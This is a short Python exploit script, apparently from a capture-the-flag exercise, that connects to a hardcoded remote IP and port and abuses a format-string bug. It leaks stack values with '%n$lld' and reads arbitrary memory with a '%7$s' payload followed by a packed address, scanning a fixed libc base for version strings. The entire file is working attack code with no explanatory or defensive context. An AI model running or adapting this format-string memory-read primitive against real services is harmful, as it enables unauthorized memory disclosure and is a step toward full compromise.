#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.04)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)

s=newconn()
libc_base = 0x7b2b42340000
print("scanning libc for version...")
found=[]
for off in range(0x1a0000, 0x210000, 0x100):
    X=libc_base+off
    r=readmem(s,X)
    strb=r.split(b'AAAA')[0] if b'AAAA' in r else r
    if b'GNU' in strb or b'GLIBC' in strb or b'version' in strb.lower() or b'Ubuntu' in strb:
        print("version-ish at",hex(X),repr(strb[:100]))
        found.append((X,strb))
    if off%0x10000==0: print("  ...",hex(X))
print("found",len(found))
s.close()
